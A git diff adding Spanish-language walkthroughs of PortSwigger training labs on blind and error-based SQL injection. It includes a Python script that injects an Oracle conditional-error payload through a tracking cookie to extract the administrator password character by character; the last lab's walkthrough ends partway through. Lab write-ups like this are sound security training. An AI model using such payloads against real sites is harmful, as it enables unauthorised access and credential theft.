@@ -370,3 +370,200 @@ print(f"\n[+] Contraseña completa encontrada: {password}")
 Nos logueamos con las credenciales.
 
 <figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+## Lab 12: Blind SQL injection with conditional errors
+
+### Enunciado
+
+Este laboratorio contiene una **vulnerabilidad de inyección SQL ciega (blind SQL injection)**. La aplicación utiliza una **cookie de seguimiento** para análisis y realiza una consulta SQL que incluye el valor de esa cookie.
+
+Los resultados de la consulta **no se devuelven**, y **la aplicación no responde de forma diferente según si la consulta devuelve filas o no**. Sin embargo, **si la consulta provoca un error, la aplicación muestra un mensaje de error personalizado**.
+
+La base de datos contiene una tabla llamada **`users`** con las columnas **`username`** y **`password`**. **Explotar la vulnerabilidad de inyección SQL ciega basada en errores para averiguar la contraseña del usuario `administrator`, e iniciar sesión como ese usuario.**
+
+### Resolución
+
+Vemos dónde tenemos la vulnerabilidad añadiendo la comilla al **TrackingID** y recargando la página forzamos el error.
+
+<figure><img src="../../.gitbook/assets/image (1442).png" alt=""><figcaption></figcaption></figure>
+
+
+
+Estamos frente a una base de datos Oracle.
+
+<figure><img src="../../.gitbook/assets/image (1443).png" alt=""><figcaption></figcaption></figure>
+
+Ahora vamos a confirmar si hay una tabla de usuarios.
+
+<figure><img src="../../.gitbook/assets/image (1445).png" alt=""><figcaption></figcaption></figure>
+
+Como la hay vamos a ver si está el usuario en esa tabla. Si nos da error es que existe ya que estamos realizando la consulta al revés.
+
+<figure><img src="../../.gitbook/assets/image (1446).png" alt=""><figcaption></figcaption></figure>
+
+Confirmamos que hay un administrator como usuario. Toca conseguir la contraseña del usuario. Primero los caracteres.
+
+<figure><img src="../../.gitbook/assets/image (1448).png" alt=""><figcaption></figcaption></figure>
+
+Miramos 30 caracteres.
+
+<figure><img src="../../.gitbook/assets/image (1450).png" alt=""><figcaption></figcaption></figure>
+
+Vamos al **Intruder** para ver cuántos caracteres exactamente tiene la contraseña.
+
+<figure><img src="../../.gitbook/assets/image (1451).png" alt=""><figcaption></figcaption></figure>
+
+Vemos que tiene 20 caracteres tal como paso en el anterior podemos hacer Cluster Bomb o un script en Python para aligerar y hacerlo más automático hago el script.
+
+<figure><img src="../../.gitbook/assets/image (1452).png" alt=""><figcaption></figcaption></figure>
+
+```
+#!/usr/bin/env python3
+
+import requests
+from string import ascii_lowercase, digits
+
+def main():
+        url = 'https://0aa2009404cb485d801e26cc00f80097.web-security-academy.net/'
+        trackingid = 'APnrWlyEfL4OH51h'
+
+        chars = ascii_lowercase + digits
+        position = 1
+        password = ''
+
+        try:
+                while True:
+                        for character in chars:
+                                payload = f"""{trackingid}'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"""
+
+                                cookie = {
+                                        'session': 'YOUR_SESSIONID',
+                                        'TrackingId': payload
+                                }
+
+                                r = requests.get(url, cookies=cookie)
+
+                                if r.status_code == 200:
+                                        # print('Error occurred')
+                                        continue
+                                else:
+                                        # print('No error')
+                                        position += 1
+                                        password += ''.join(character)
+                                        print(f'[+] Found password: {password}', end='\r')
+                                        break
+
+                        if len(password) >= 20:
+                                print(f'[+] administrator password: {password}')
+                                exit()
+        except KeyboardInterrupt:
+                print('\n[*] Bye!')
+
+if __name__ == '__main__':
+        main()
+```
+
+{% hint style="info" %}
+Este script se ha cogido de esta resolución [https://siunam321.github.io/ctf/portswigger-labs/SQL-Injection/sqli-12/](https://siunam321.github.io/ctf/portswigger-labs/SQL-Injection/sqli-12/)
+{% endhint %}
+
+<figure><img src="../../.gitbook/assets/image (1453).png" alt=""><figcaption></figcaption></figure>
+
+Nos logueamos.
+
+<figure><img src="../../.gitbook/assets/image (1454).png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Visible error-based SQL injection
+
+### Enunciado
+
+**Este laboratorio contiene una vulnerabilidad de inyección SQL.** La aplicación usa una **cookie de seguimiento (tracking cookie)** para análisis, y realiza una **consulta SQL** que incluye el valor enviado en esa cookie.
+
+**Los resultados de la consulta no se devuelven** al usuario. La base de datos contiene una tabla diferente llamada **`users`**, con columnas **`username`** y **`password`**.
+
+**Para resolver el laboratorio, debes encontrar una forma de filtrar (leak) la contraseña del usuario `administrator`, y luego iniciar sesión en su cuenta.**
+
+### Resolución
+
+Vemos la vulnerabilidad que en este caso sigue siendo el **TrackingID** añadiendo una comilla.
+
+<figure><img src="../../.gitbook/assets/image (1456).png" alt=""><figcaption></figcaption></figure>
+
+El error que se nos muestra es muy llamativo ya que nos dice que el valor de la cookie se inyecta en la consulta. Hacemos pequeña modificación para que no nos salga ese error.
+
+<figure><img src="../../.gitbook/assets/image (1457).png" alt=""><figcaption></figcaption></figure>
+
+Vamos a ver con el siguiente payload la estructura de la consulta.
+
+<figure><img src="../../.gitbook/assets/image (1458).png" alt=""><figcaption></figcaption></figure>
+
+Nos da error vamos a cambiarla a hacer una expresión booleana.
+
+<figure><img src="../../.gitbook/assets/image (1459).png" alt=""><figcaption></figcaption></figure>
+
+Con esto demostramos que podemos inyectar sin romper la consulta. vamos a ver si extraemos datos de usuarios.
+
+<figure><img src="../../.gitbook/assets/image (1462).png" alt=""><figcaption></figcaption></figure>
+
+Nos da un error nuevo por que vamos a cambiarlo y limitamos la consulta.
+
+<figure><img src="../../.gitbook/assets/image (1461).png" alt=""><figcaption></figcaption></figure>
+
+Vemos que existe el usuario por lo que nos falta extraer la contraseña.
+
+<figure><img src="../../.gitbook/assets/image (1463).png" alt=""><figcaption></figcaption></figure>
+
+Se nos muestra otro error que delata la contraseña por lo que nos logueamos con las credenciales.
+
+<figure><img src="../../.gitbook/assets/image (1464).png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Blind SQL injection with time delays
+
+### Enunciado
+
+**Este laboratorio contiene una vulnerabilidad de inyección SQL ciega (blind SQL injection).**
+
+La aplicación utiliza una **cookie de seguimiento (tracking cookie)** para análisis, y realiza una **consulta SQL** que incluye el valor enviado en dicha cookie.
+
+**Los resultados de la consulta no se devuelven**, y la aplicación **no responde de forma diferente** dependiendo de si la consulta devuelve filas o provoca un error.
+
+Sin embargo, dado que la consulta se ejecuta de forma **sincrónica**, es posible **provocar retrasos condicionales en la ejecución** para inferir información.
+
+### Resolución
+
+Vamos a ver qué tipo de base de datos es.
+
+<figure><img src="../../.gitbook/assets/image (1465).png" alt=""><figcaption></figcaption></figure>
+
+Es base de datos PostgreSQL.
+
+<figure><img src="../../.gitbook/assets/image (1466).png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Blind SQL injection with time delays and information retrieval
+
+### Enunciado
+
+**Este laboratorio contiene una vulnerabilidad de inyección SQL ciega (blind SQL injection).**
+
+La aplicación utiliza una **cookie de seguimiento (tracking cookie)** para análisis, y realiza una **consulta SQL** que incluye el valor enviado en esa cookie.
+
+**Los resultados de la consulta no se devuelven**, y la aplicación **no responde de manera diferente** según si la consulta devuelve filas o produce un error.
+
+Sin embargo, dado que la consulta se ejecuta de forma **sincrónica**, es posible **provocar retrasos condicionales en la ejecución** para inferir información.
+
+La base de datos contiene una tabla llamada **`users`**, con columnas **`username`** y **`password`**.
+
+**Explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario `administrator`, e iniciar sesión en su cuenta.**
+
+### Resolución
+
+Vamos a ver qué base de datos es.
+
+<figure><img src="../../.gitbook/assets/image (1467).png" alt=""><figcaption></figcaption></figure>
+
+Sabiendo esto miramos el siguiente payload.
+
+<figure><img src="../../.gitbook/assets/image (1468).png" alt=""><figcaption></figcaption></figure>
+
+Vamos a dormir la base de datos si existe el usuario en la tabla users.
+
